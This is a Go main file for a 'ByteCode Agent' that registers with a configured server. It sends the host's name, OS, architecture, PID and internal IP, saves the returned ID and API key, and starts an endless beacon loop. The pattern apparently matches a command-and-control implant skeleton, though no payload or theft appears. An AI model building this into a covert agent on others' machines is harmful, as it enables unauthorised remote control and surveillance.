package main

import (
	"fmt"
	"log"
	"os"

	"bytecode-agent/internal/beacon"
	"bytecode-agent/internal/comms"
	"bytecode-agent/internal/config"
	"bytecode-agent/internal/identity"
)

func main() {
	// Banner
	fmt.Println("")
	fmt.Println("  ╔══════════════════════════════════════╗")
	fmt.Println("  ║     ByteCode Agent v1.0.0            ║")
	fmt.Println("  ╚══════════════════════════════════════╝")
	fmt.Println("")

	// Load configuration
	cfg := config.Load()
	log.Printf("[INIT] Server: %s\n", cfg.ServerURL)

	// Create HTTP client
	client := comms.NewClient(cfg.ServerURL)

	// Try to load existing identity
	existingID, err := identity.Load(cfg.IdentityFile)
	if err == nil && existingID.AgentID != "" {
		// Resume existing identity
		log.Printf("[INIT] Resuming identity: %s\n", existingID)
		client.SetAPIKey(existingID.APIKey)
	} else {
		// Register as new agent
		log.Println("[INIT] No existing identity found, registering...")

		sysInfo := identity.GetSystemInfo()
		regReq := &comms.RegisterRequest{
			Hostname:   sysInfo.Hostname,
			OS:         sysInfo.OS,
			Arch:       sysInfo.Arch,
			PID:        sysInfo.PID,
			InternalIP: sysInfo.InternalIP,
		}

		regResp, err := client.Register(regReq)
		if err != nil {
			log.Fatalf("[FATAL] Registration failed: %v\n", err)
			os.Exit(1)
		}

		// Save identity to disk
		newID := &identity.Identity{
			AgentID:  regResp.AgentID,
			APIKey:   regResp.APIKey,
			Hostname: sysInfo.Hostname,
			OS:       sysInfo.OS,
			Arch:     sysInfo.Arch,
		}

		if err := identity.Save(cfg.IdentityFile, newID); err != nil {
			log.Printf("[WARN] Failed to save identity: %v\n", err)
		}

		client.SetAPIKey(regResp.APIKey)
		log.Printf("[INIT] Registered successfully: %s\n", newID)
	}

	// Start the beacon loop (runs forever)
	beacon.Loop(client, cfg)
}
